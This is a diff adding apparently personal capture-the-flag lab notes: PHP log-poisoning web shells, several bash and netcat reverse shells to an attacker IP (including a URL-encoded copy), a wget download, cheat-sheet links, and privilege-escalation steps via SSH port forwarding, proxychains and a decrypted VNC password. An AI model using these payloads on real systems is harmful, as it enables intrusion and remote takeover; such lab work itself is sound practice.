@@ -1,0 +1,110 @@
+GET /<?php shell_exec("curl http://10.10.16.17");?>
+
+
+GET /<?php phpinfo(); ?>
+
+
+<?php echo system($_GET['cmd']); ?>
+
+/bin/bash -c 'bash -i > /dev/tcp/10.10.16.17/443 0>%261'
+
+wget http://10.10.16.17/asd.txt
+
+
+/bash -i >& /dev/tcp/10.10.16.17/443 0>&1
+
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/443 0>&1'
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 443 >/tmp/f
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 443 >/tmp/f
+
+rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.17%20443%20%3E%2Ftmp%2Ff
+
+
+urlencode!!
+
+https://www.urlencoder.org/
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
+
+https://sentrywhale.com/documentation/reverse-shell
+
+/bin/sh: bash: not found
+
+
+https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+you did well....
+
+user.txt -> right infront of you... PWDDUMP.... PASSWORDDUMP... read the instructions
+
+
+root.txt
+
+hmmm theres a secret.zip.... o its password protected
+
+ooooo some hex file... maybe we can use it later
+
+ps -aux shows that root is running vnc.... LOCALLY not exposed
+
+ssh local port forwarding so that we direct all our requests via ssh, hence able to access the locally available port
+
+hmmmm maybe that secret is the secret to the vnc server?
+
+https://github.com/trinitronx/vncpasswd.py
+
+you got it!
+
+ssh charix@XXX.XXX.XXX.XXX -D 8081
+
+proxychains is 8081
+127.0.0.1 8081
+
+proxychains vncviewer 127.0.0.1:5901
+
+
+Decrypted Bin Pass= 'VNCP@$$!'
+Decrypted Hex Pass= '564e435040242421'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
